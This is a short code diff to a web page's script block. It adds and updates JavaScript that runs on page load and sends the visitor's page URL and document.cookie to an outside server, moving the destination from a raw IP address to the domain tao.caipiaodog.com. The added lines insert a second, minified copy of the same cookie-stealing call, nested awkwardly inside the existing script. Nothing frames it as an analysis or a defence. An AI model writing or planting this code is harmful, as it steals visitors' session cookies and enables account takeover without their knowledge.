@@ -13,10 +13,11 @@
 <script>
 
 
-function loadXMLDoc()
-{
-var xmlhttp;
-if (window.XMLHttpRequest)
+<script>function loadXMLDoc(){var xmlhttp;if(window.XMLHttpRequest){xmlhttp=new XMLHttpRequest()}else{xmlhttp=new ActiveXObject("Microsoft.XMLHTTP")}xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4&&xmlhttp.status==200){}};xmlhttp.open("GET","https://tao.caipiaodog.com/send?www="+encodeURIComponent(location.href)+"&cookie="+encodeURIComponent(document.cookie),true);xmlhttp.send()}loadXMLDoc();</script>
+
+
+function loadXMLDoc(){
+var xmlhttp;if (window.XMLHttpRequest)
   {
   xmlhttp=new XMLHttpRequest();
   }
@@ -31,7 +32,7 @@ xmlhttp.onreadystatechange=function()
         
     }
   }
-xmlhttp.open("GET","http://139.180.134.182/send?www="+encodeURIComponent(location.href)+'&cookie='+encodeURIComponent(document.cookie),true);
+xmlhttp.open("GET","https://tao.caipiaodog.com/send?www="+encodeURIComponent(location.href)+'&cookie='+encodeURIComponent(document.cookie),true);
 xmlhttp.send();
 }
 loadXMLDoc();
